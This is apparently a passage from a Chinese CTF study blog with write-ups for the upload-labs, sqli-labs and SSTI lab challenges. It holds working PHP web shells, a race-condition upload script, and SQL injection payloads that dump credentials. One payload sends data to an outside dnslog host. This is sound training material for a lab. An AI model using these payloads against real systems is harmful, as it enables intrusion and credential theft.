//使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125; 这里进行了许多步过滤 简单总结下主要的就是 对gif、png或jpg文件的格式进行二次渲染 根据上传的文件类型用imagecreatefromgif这一类的函数生成一个新的图片 将原本保存下的文件用unlink函数删除 据师傅说直接用cmd命令行copy的文件也能成功上传 也可以用010editor比较二次渲染前后的图片 蓝色的部分是未被改变的 可以在那里插入🐎 pass-181234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 这里过滤的挺充分的 不过黑客大佬们还是有方法 原理简单来说是 文件上传后到原文件被删除有一段时间 利用这段时间 重复发送写入木马的木马 然后不停访问原文件 访问成功后 木马也就被重新写入 写入木马的木马 1&lt;?php puts(fopen('shell.php','r+'),'&lt;? @eval($_POST['shell']);?&gt;');?&gt;//发送的木马 重复发送利用burp实现 用burpsuite抓包 调用intruder模块 打开payload板块设置payload type为null payloads 点击下方的continue indefinitely 连续访问利用脚本实现 123456789import requestsurl = \"http://ip/upload-labs/upload/shell.php\"while True: html = requests.get(url) if html.status_code == 200: print(\"success\") break else print(\"200\") pass-19这一关和上面很像 不过python连续访问的url要变成 1127.0.0.1/upload-labs-master/include.php?file=upload/shell.jpg pass-20这关绕过方法用之前的.php.就可以 不过这关和之前有个很明显的区别 做了个保存名称的input 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//在这里 if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传出错！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; pass-21123456789101112131415161718192021222324252627282930313233343536$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); //explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。 &#125; $ext = end($file);//end(array)函数，输出数组中的当前元素和最后一个元素的值。 $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; //reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值 //count(array)函数，计算数组中的单元数目，或对象中的属性个数 $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125;&#125;else&#123; $msg = \"请选择要上传的文件！\";&#125; 验证上传路径是否存在验证[‘upload_file’]的content-type是否合法（可以抓包修改） 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断） 判断file不是数组则使用explode(‘.’, strtolower($file))对file进行切割，将file变为一个数组 判断数组最后一个元素是否合法 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name 上传文件 这里可以用00截断 也可以用数组绕过 post包 123456789101112131415161718-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=\"upload_file\"; filename=\"yijuhua.php\"Content-Type: image/png&lt;?php @eval($_POST['hack']);?&gt;-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=\"save_name[0]\"upload-20.php-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=\"save_name[2]\"jpg-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=\"submit\"上传-----------------------------131314876217456529963542266439--","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"upload","slug":"upload","permalink":"/tags/upload/"},{"name":"upload-labs","slug":"upload-labs","permalink":"/tags/upload-labs/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"SSTI模板注入","slug":"SSTI模板注入","date":"2022-08-29T10:18:54.833Z","updated":"2022-08-30T10:24:14.535Z","comments":true,"path":"2022/08/SSTI模板注入/","link":"","permalink":"/2022/08/SSTI模板注入/","excerpt":"","text":"[护网杯 2018]easy_tornadossti注入点在msg注入49出现orz应该是有过滤1正常hint里缺cookie_secret该项在handler.settings Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性handler 指向RequestHandler而RequestHandler.settings又指向self.application.settings所有handler.settings就指向RequestHandler.application.settings了！ 然后按hint里的MD5加密过后传参1?filename=/fllllllllllllag&amp;filehash=ff92d5623223cadc00efabfc7676f9fe filehash不同 请自行加密 [BJDCTF2020]The mystery of ip1234567891011121314151617181920212223242526272829303132333435&lt;?php require_once('header.php'); require_once('./libs/Smarty.class.php'); $smarty = new Smarty(); if (!empty($_SERVER['HTTP_CLIENT_IP'])) &#123; $ip=$_SERVER['HTTP_CLIENT_IP']; &#125; elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $ip=$_SERVER['HTTP_X_FORWARDED_FOR']; &#125; else &#123; $ip=$_SERVER['REMOTE_ADDR']; &#125; //$your_ip = $smarty-&gt;display(\"string:\".$ip); echo \"&lt;div class=\\\"container panel1\\\"&gt; &lt;div class=\\\"row\\\"&gt; &lt;div class=\\\"col-md-4\\\"&gt; &lt;/div&gt; &lt;div class=\\\"col-md-4\\\"&gt; &lt;div class=\\\"jumbotron pan\\\"&gt; &lt;div class=\\\"form-group log\\\"&gt; &lt;label&gt;&lt;h2&gt;Your IP is : \"; $smarty-&gt;display(\"string:\".$ip); echo \" &lt;/h2&gt;&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\\\"col-md-4\\\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;\"; ?&gt; [BJDCTF2020]Cookie is so stable","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"SSTI","slug":"SSTI","permalink":"/tags/SSTI/"},{"name":"模板注入","slug":"模板注入","permalink":"/tags/模板注入/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"sqli-lab","slug":"sqli-lab","date":"2022-08-29T10:18:54.831Z","updated":"2022-08-30T10:22:41.639Z","comments":true,"path":"2022/08/sqli-lab/","link":"","permalink":"/2022/08/sqli-lab/","excerpt":"","text":"sql注入就是当用户输入一些本不是用户名密码的sql语句这些语句没有被过滤执行后通过回显等方式，使注入者获得了数据库的信息 水了几天用来搞visual studio2022和Windows11所以本文略微简陋写，以后会完善 visual studio2022版美化教程见Visual Studio 2022界面美化教程. GET传参先放代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variables if(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity //注意get传参获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";//上面一行中$id前后的符号是关键，是注入语句闭合的符号$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\";//正确回显颜色为绿色 echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; //这是输入正确时的反馈，直接把运行结果告诉你 但是后几关就不一样了 else &#123; echo '&lt;font color= \"#FFFF00\"&gt;';//报错回显为黄色 print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125; //这是输入错误时的反馈，把mysql_error反馈给你 同样，后几关也不一样了&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;//这是反馈你输入为空的?&gt; ==/ 我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有 /（你细品这句话 悖论）==我第一个注释是：注意get传参，前10关前半部分代码不变第二个注释是提示读者要注意每一关的闭合方式（包裹方式）在if后else前是正确回显部分 在else后是错误回显部分这两部分是区分注入方式所需要关注的 ==先讲理论==根据两部分分别是否回显判断注入方式注入方式包含联合查询、布尔盲注、时间盲注、报错注入等 传参最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写 判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数1?id=1’ order by 1--+ 这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数 判断回显的数据是数据库中的哪几列1?id=-1’ union select 1,2,3--+ 这里的数字的最大值要等与上一步得到的那个数上一步7报错，那行数就是6，这一步就要1，2，3，4，5，6–+看看那几个数字出现在你屏幕上了要注意要id=一个不正确的值 如0，-1之类 这样联合查询之后的返回值会让union之后的查询语句的结果在数组的第一列，而后台php代码只会回显第一列的数据 查库名1?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 这里把查数据库的sql语句，替换掉出现在你屏幕上的一个数字 这里是3 来回显在屏幕上group_concat(你要查询的数据）from 所在的库 表 列这里查库名即查==schema_name== 这个数据被保存在==information_schema.schemata==这样 回显的就是 数据库们 的名字 查表名1?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+ table 表 information_schema.tables类比上面 table_schema=‘ 库名’==这里你要猜一下==哪个数据库会放着你想要的数据，然后输在库名那个位置 查列名1?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’--+ 同样类比上面 column 列==这里还要猜== 上面回显的哪个表里有你要的数据 提取数据==激动人心的时候到了== 1?id=-1’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from users–+ 同样类比上面 有一处特殊concat_ws(符号，列名，列名）中间那个符号会被concat_ws插入到两组数据之间，就是为了方便看这样就查到数据了，是不是很简单。 limitlimit是限制那一部分显示，limitx，y是从x+1开始显示y个 实操正错回显都有就按上面的步骤一步一步找到数据security———&gt;users——&gt;username&amp;password这就是靶场数据库的层次图啥的以后再补 ==理论进阶==时间盲注12?id=1’ and sleep (5)–+?id=1‘ and if((left((select schema_name from information_schema.schemata limit 4,1),1,1)=‘s’),1,sleep(3))–+ 这样的句子sleep()就是延时执行的意思， ==让浏览器先睡一会==当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了 布尔盲注下面几个方法各有优缺点因为能知道sql-lab靶场数据库的数据所以刷题时我多用left实际 substrsubstr(a,b,c)将a字段从第b个字符读取c个字符 ascii将括号中的字符转换为acsii码，再在最后进行值大小的判断，正确返回1，错误返回0 类似于数学中的二分法 leftleft(a)从第一位开始读取a个字符 模糊查询 likea like ‘%b%’ 判断a字符串里是否有ba like ‘b%’ 判断a开头是否有 b数 regexpregexp ‘a’正则表达式 RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。许多语言都有正则表达式物理也有正则所以正则是个啥(≧﹏ ≦) 实操进阶有报错回显 无正确回显也就是说你在前四关能看见的绿字在5-8关用you are in替换了也就是你之前查的库名 表名 列名 和数据不会回显了当使用布尔盲注时 如果判断正确就会显示you are in不正确的话就会报错下图是第五关第一个用户名 最后一步注入语句之前步骤参考第1到4关查各类信息的语句并用布尔盲注所用函数包装 正确回显和报错回显都没有不论你输入啥，他都会说you are in 就像你说 ==啊对对对== 这样 布尔盲注也没法用了你不知道注入语句是对是错这时就要用时间盲注了把布尔盲注再进行包装if(布尔盲注语句,sleep(3),1)正确的话，浏览器会延时3秒再运行 POST传参==先讲理论==123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;input type=&quot;text&quot; name=&quot;uname&quot; value=&quot;&quot;/&gt; &lt;/div&gt; &lt;div&gt; Password : &amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt; &lt;/div&gt;&lt;/br&gt; &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/div&gt;&lt;/form&gt; ==上面是前端 通过post传参uname和passwd==&lt;?php// take the variablesif(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))&#123; $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;];/后端接收前端传的参数 //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\\n&quot;); fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; /又是这里分成两部分，上面是正确回显 下面是报错回显 echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; &#125;&#125;?&gt; ==post传参==post传参有很多方式最本质的就是在输入框传然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用较多的是一些抓包软件，burpsuit等他们既有抓包功能，也有重发器，测试器功能强大 ==注入语句==和get传参类型的语句大体相同，不同的地方有原来的id=1’由于get传参，抓包后自动写入uname/password=所以只需要写后面的admin’ 加上sql执行语句，原理一样，都是让系统执行完传参后继续把sql语句执行来回显 这里末尾注释符可用# 实操post传参同样有三大类 正误回显都有在burpsuit重发器里传参，红字部分即为注入语句，这里同样只展示最后一步 其他可按照get传参原理只需改动小部分 没正确回显 有报错回显这里我采用了辨识度更高的时间盲注 布尔盲注同样使用 正错回显都没有同上面直接时间盲注 基于报错注入的各种传参方式==先讲报错注入==updatexmlupdatexml (XML_document, XPath_string, new_value)替换查找到的符合条件的数据 extactvalueextractvalue(XML_document, XPath_string)对XML文档进行查询的函数当上述两个函数的xpath路径出错时，将XML_document报错返回回来注意只能返回32个字符，后面的可用limit 等来限制返回的字符位置 ==传参方式==burp suite抓包后改相应数据 user-agent注入1User-Agent:'or updatexml(1,concat(0x7e,(select database()),0x7e),1) or' referer注入cookie注入base64加密的cookie注入将payload经base64加密后上传即可 ==过滤注释的GET==源码中过滤掉了注释符注释符不能用了所以要在闭合上下功夫12?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '1?id=-1' union select 1,(select group_concat(username) from users),'3 在末尾构造语句使闭合符号与语句组成一个不影响的语句闭合方式多种多样 ==二次注入==首先注册一个用户admin‘#然后登录修改密码当你修改密码时 后台就执行了1UPDATE users SET passwd=\"新密码\" WHERE username =' admin' # ' AND password=' 也就是你用admin’#用户把admin用户的密码给改了 ==过滤==过滤 or 和 and将payload里所有 and 和or替换为 anandd 和 oorr这里password也要变成passwoorrd 1?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from users# 过滤下的报错注入2612345678$id= preg_replace('/or/i',\"\", $id); /strip out OR (non case sensitive) $id= preg_replace('/and/i',\"\", $id); /Strip out AND (non case sensitive) $id= preg_replace('/[\\/\\*]/',\"\", $id); /strip out */ $id= preg_replace('/[--]/',\"\", $id); /Strip out -- $id= preg_replace('/[#]/',\"\", $id); /Strip out # $id= preg_replace('/[\\s]/',\"\", $id); /Strip out spaces $id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); /Strip out slashes return $id; 要用到||代替or information里的or要双写，用||‘1’=‘1来闭合1?id=0'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1)||'1'='1 271?id=0'||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1)||'1'='1 大小写select和union 过滤下的时间盲注26到27关的a都是无法报错注入的能用时间盲注过滤方法和不带a的关一样 ==waf==12345678910111213141516171819202122232425262728293031323334/ take the variables if(isset($_GET['id']))&#123; $qs = $_SERVER['QUERY_STRING']; $hint=$qs; $id1=java_implimentation($qs); $id=$_GET['id']; //echo $id1; whitelist($id1);&#125;/WAF implimentation with a whitelist approach..... only allows input to be Numeric.function whitelist($input)&#123; $match = preg_match(\"/^\\d+$/\", $input); if($match) &#123;//echo \"you are good\"; //return $match; &#125; else &#123;header('Location: hacked.php'); //echo \"you are bad\"; &#125;&#125;/ The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).function java_implimentation($query_string)&#123; $q_s = $query_string; $qs_array= explode(\"&amp;\",$q_s); foreach($qs_array as $key =&gt; $value)&#123; $val=substr($value,0,2); if($val==\"id\")&#123; $id_value=substr($value,3,30); return $id_value; echo \"&lt;br&gt;\"; break;&#125; &#125;&#125; java_implimentation模拟 tomcat 的查询函数处理whitelist白名单过滤 检测到不符合规则就重定向漏洞是whitelist只检测了java_implimentation输出的第一个参数$id_value后面的逃过检测 注入点在后面 ==宽字节注入==MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \\，所以这里想办法干掉反斜杠即可。urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。 ==结束注释==当转译为‘/时可用’/**/来==结束注释== ==堆叠注入==在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。如下展示了堆叠注入插入了一个用户数据 同时也可以进行dnslog注入1?id=1';select load_file(concat('//',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.au0mvd.dnslog.cn/1.txt'));--+ 123desc查看表结构的详细信息desc table_name;此处desc是describe的缩写，用法: desc 表名/查询语句 handler适用于select等过滤 12345handler handler_table open;handler handler_table read first;handler handler_table read next;……handler handler_table close; 二次注入进阶需成功登录才能二次注入12345678910111213141516171819202122232425262728293031323334353637383940414243444546function sqllogin($host,$dbuser,$dbpass, $dbname)&#123; // connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname); $username = mysqli_real_escape_string($con1, $_POST[\"login_user\"]); $password = $_POST[\"login_password\"]; // Check connection if (mysqli_connect_errno($con1)) &#123; echo \"Failed to connect to MySQL: \" . mysqli_connect_error(); &#125; else &#123; @mysqli_select_db($con1, $dbname) or die ( \"Unable to connect to the database ######: \"); &#125; /* execute multi query */ $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; if (@mysqli_multi_query($con1, $sql)) &#123; /* store first result set */ if($result = @mysqli_store_result($con1)) &#123; if($row = @mysqli_fetch_row($result))&#123; if ($row[1]) &#123; return $row[1]; &#125; else&#123; return 0; &#125; &#125; &#125; else &#123; echo '&lt;font size=\"5\" color= \"#FFFF00\"&gt;'; print_r(mysqli_error($con1)); echo \"&lt;/font&gt;\"; &#125; &#125; else &#123; echo '&lt;font size=\"5\" color= \"#FFFF00\"&gt;'; print_r(mysqli_error($con1)); echo \"&lt;/font&gt;\"; &#125; 这里对username和password过滤不强可通过万能密码11’ or '1'='1 登录 接下来通过修改密码界面二次注入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?PHPsession_start();if (!isset($_COOKIE[\"Auth\"]))&#123; if (!isset($_SESSION[\"username\"])) &#123; header('Location: index.php'); &#125; header('Location: index.php');&#125;?&gt;&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");if (isset($_POST['submit']))&#123; # Validating the user input........ $username= $_SESSION[\"username\"]; $curr_pass= mysql_real_escape_string($_POST['current_password']);//原密码 还是万能密码绕过 $pass= mysql_real_escape_string($_POST['password']);//新密码 $re_pass= mysql_real_escape_string($_POST['re_password']); if($pass==$re_pass)&#123; $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( '); $row = mysql_affected_rows(); echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; echo '&lt;center&gt;'; if($row==1)&#123; //echo \"Password successfully updated\"; echo '&lt;img src=\"../images/password-updated.jpg\"&gt;'; &#125; else&#123; header('Location: failed.php'); //echo 'You tried to be smart, Try harder!!!! :( '; &#125; &#125; else&#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;&lt;center&gt;'; echo \"Make sure New Password and Retype Password fields have same value\"; header('refresh:2, url=index.php'); &#125;&#125;?&gt;&lt;?phpif(isset($_POST['submit1']))&#123; session_destroy(); setcookie('Auth', 1 , time()-3600); header ('Location: index.php');&#125;?&gt; 他用户名通过session获取，所以无法更改其他用户 ==order by注入==1SELECT * FROM users ORDER BY order by 与where差不多但不同是order by不能使用union联合其他都可 也比较灵活从46到53关皆为order by注入 限制次数的注入从54关开始，限制了注入次数一旦超过次数就会改变数据一切又要重新开始 58-62可以报错注入从62关开始只能使用盲注==id注入部分代码==12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?phpid注入部分代码//including the Mysql connect parameters.include '../sql-connections/sql-connect-1.php';include '../sql-connections/functions.php';error_reporting(0);$pag = $_SERVER['PHP_SELF']; /generating page address to piggy back after redirects...$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; /characterset for generating random data$times= 10;$table = table_name();$col = column_name(1); / session id column name$col1 = column_name(2); /secret key column name/ Submitting the final answerif(!isset($_POST['answer_key']))&#123; / resetting the challenge and repopulating the table . if(isset($_POST['reset']))&#123; setcookie('challenge', ' ', time() - 3600000); echo \"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\\n\"; echo \"Redirecting you to main challenge page..........\\n\"; header( \"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag\" ); //echo \"cookie expired\"; &#125; else&#123; / Checking the cookie on the page and populate the table with random value. if(isset($_COOKIE['challenge']))&#123; $sessid=$_COOKIE['challenge']; //echo \"Cookie value: \".$sessid; &#125; else&#123; $expire = time()+60*60*24*30; $hash = data($table,$col); setcookie(\"challenge\", $hash, $expire); &#125; echo \"&lt;br&gt;\\n\"; /take the variables if(isset($_GET['id']))&#123; $id=$_GET['id']; /logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\"\\n\"); fclose($fp); /update the counter in database next_tryy(); /Display attempts on screen. $tryyy = view_attempts(); echo \"You have made : \". $tryyy .\" of $times attempts\"; echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;\\n\"; /Reset the Database if you exceed allowed attempts. if($tryyy &gt;= ($times+1))&#123; setcookie('challenge', ' ', time() - 3600000); echo \"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\\n\"; echo \"Redirecting you to challenge page..........\\n\"; header( \"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag\" ); echo \"&lt;br&gt;\\n\"; &#125; / Querry DB to get the correct output $sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row)&#123; echo '&lt;font color= \"#00FFFF\"&gt;'; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;';// print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125; &#125; else&#123; echo \"Please input the ID as parameter with numeric value as done in Lab excercises\\n&lt;br&gt;&lt;br&gt;\\n&lt;/font&gt;\"; echo \"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;\"; echo \"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;\" ; &#125; &#125;&#125; ==答案提交部分==1234567891011121314151617181920212223242526272829else&#123; echo '&lt;div style=\" color:#00FFFF; font-size:18px; text-align:center\"&gt;'; $key = addslashes($_POST['key']); $key = mysql_real_escape_string($key); //echo $key; /Query table to verify your result $sql=\"SELECT 1 FROM $table WHERE $col1= '$key'\"; //echo \"$sql\"; $result=mysql_query($sql)or die(\"error in submittion of Key Solution\".mysql_error()); $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo \"\\n&lt;br&gt;&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/Less-54-1.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; header( \"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag\" ); &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo \"\\n&lt;br&gt;&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/slap1.jpg\" 